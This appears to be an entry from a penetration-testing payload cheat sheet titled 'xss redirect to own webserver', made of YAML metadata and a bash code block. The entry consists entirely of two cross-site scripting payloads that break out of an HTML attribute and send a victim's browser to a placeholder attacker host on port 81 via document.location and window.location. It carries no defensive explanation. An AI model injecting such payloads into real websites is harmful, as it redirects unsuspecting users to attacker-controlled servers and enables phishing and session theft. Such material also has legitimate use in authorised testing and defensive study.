---
id: e9767002-0681-4d8f-b5a0-f0ba01b26ef9
name: xss redirect to own webserver
type: command
executor: bash
data: '''">><script>document.location="http://attacker-ip:81";</script>

  ''">><script>window.location="http://attacker-ip:81";</script>

  '
output: null
created_at: '2020-07-14T18:14:36.798677+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# xss redirect to own webserver

```bash
'">><script>document.location="http://attacker-ip:81";</script>
'">><script>window.location="http://attacker-ip:81";</script>

```
